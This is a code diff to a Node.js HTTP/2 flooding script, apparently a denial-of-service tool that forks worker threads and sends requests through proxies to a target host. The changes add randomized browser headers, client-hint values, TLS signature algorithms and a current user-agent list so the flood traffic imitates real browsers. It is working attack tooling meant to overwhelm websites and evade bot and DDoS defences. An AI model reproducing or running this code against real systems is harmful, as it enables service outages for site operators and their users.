@@ -20,6 +20,11 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/heic,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'application/json, text/plain, */*',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/heic,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/heic,*/*;q=0.8',
   ],
 
   cache_header = [
@@ -131,6 +136,16 @@ language_header = [
     'yo-NG,yo;q=0.8',
     'zgh-MA,zgh;q=0.8',
     'zu-ZA,zu;q=0.8',
+    'en-GB,en;q=0.9,fr;q=0.8',
+    'de-DE,de;q=0.9,en;q=0.8',
+    'es-ES,es;q=0.9,en;q=0.8',
+    'it-IT,it;q=0.9,en;q=0.8',
+    'ja-JP,ja;q=0.9,en;q=0.8',
+    'ko-KR,ko;q=0.9,en;q=0.8',
+    'zh-CN,zh;q=0.9,en;q=0.8',
+    'ar-SA,ar;q=0.9,en;q=0.8',
+    'hi-IN,hi;q=0.9,en;q=0.8',
+    'id-ID,id;q=0.9,en;q=0.8',
   ];
   const fetch_site = [
     "same-origin"
@@ -168,7 +183,9 @@ language_header = [
           "rsa_pss_rsae_sha384",
           "rsa_pkcs1_sha384",
           "rsa_pss_rsae_sha512",
-          "rsa_pkcs1_sha512"
+          "rsa_pkcs1_sha512",
+          "ed25519",
+          "ed448"
 ]
   let SignalsList = sigalgs.join(':')
 const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
@@ -242,7 +259,7 @@ if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-} else {setInterval(runFlooder) }
+} else {runFlooder()}
 
 
  class NetSocket {
@@ -438,10 +455,12 @@ const randstrsValue = randstrs(10);
          var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
          
   encoding_header = [
-    'gzip, deflate, br'
-    , 'compress, gzip'
-    , 'deflate, gzip'
-    , 'gzip, identity'
+    'gzip, deflate, br',
+    'compress, gzip',
+    'deflate, gzip',
+    'gzip, identity',
+    'gzip, deflate, br, zstd',
+    'br, gzip, deflate'
   ];
   function randstrr(length) {
 		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
@@ -492,6 +511,23 @@ const randstrsValue = randstrs(10);
        {'Delta-Base' : '12340001'},
        {"te": "trailers"},
        {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+       {"sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1"},
+       {"sec-ch-prefers-color-scheme": Math.random() < 0.5 ? "light" : "dark"},
+       {"sec-ch-prefers-reduced-motion": "no-preference"},
+       {"viewport-width": "1920"},
+];
+const secChUa = [
+  '"Not)A;Brand";v="99", "Google Chrome";v="134", "Chromium";v="134"',
+  '"Microsoft Edge";v="134", "Chromium";v="134", "Not)A;Brand";v="99"',
+  '"Not)A;Brand";v="99", "Microsoft Edge";v="134", "Chromium";v="134"',
+  '"Google Chrome";v="134", "Not)A;Brand";v="99", "Chromium";v="134"',
+];
+const secChUaPlatform = [
+  '"Windows"',
+  '"macOS"',
+  '"Linux"',
+  '"Android"',
+  '"iOS"',
 ];
 let headers = {
   ":authority": parsedTarget.host,
@@ -505,6 +541,8 @@ let headers = {
   "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
   "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
   "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
+  "sec-ch-ua": secChUa[Math.floor(Math.random() * secChUa.length)],
+  "sec-ch-ua-platform": secChUaPlatform[Math.floor(Math.random() * secChUaPlatform.length)],
   "user-agent" : randomUA(),
 }
  const proxyOptions = {
@@ -513,7 +551,7 @@ let headers = {
      address: parsedTarget.host + ":443",
      timeout: 5
  };
- console.log(`Thread ${cluster.worker.id} connecting to proxy ${proxyAddr}`);
+ console.log(`[KIENSAYGEX/69] Connect proxy ${proxyAddr} to thread ${cluster.worker.id}`);
  Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) return
 
@@ -625,22 +663,21 @@ setTimeout(StopScript, args.time * 1000);
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
 
+const latestUAs = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/118.0.0.0',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Trailer/93.3.8652.5',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/360.1.737798518 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+];
 function randomUA() {
-  const osPlatforms = [
-    'Windows NT 10.0; Win64; x64',
-    'Windows NT 6.1; Win64; x64',
-    'Macintosh; Intel Mac OS X 10_15_7',
-    'X11; Linux x86_64',
-    'X11; Ubuntu; Linux x86_64',
-    'iPhone; CPU iPhone OS 14_0 like Mac OS X'
-  ];
-  const browsers = [
-    'Chrome/114.0.0.0 Safari/537.36',
-    'Firefox/113.0',
-    'Safari/537.36',
-    'Edg/114.0.1823.58',
-    'OPR/99.0.0.0'
-  ];
-  const versions = Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 1000) + '.' + Math.floor(Math.random() * 100);
-  return `Mozilla/5.0 (${randomElement(osPlatforms)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(browsers)} ${versions}`;
+  return randomElement(latestUAs);
 }
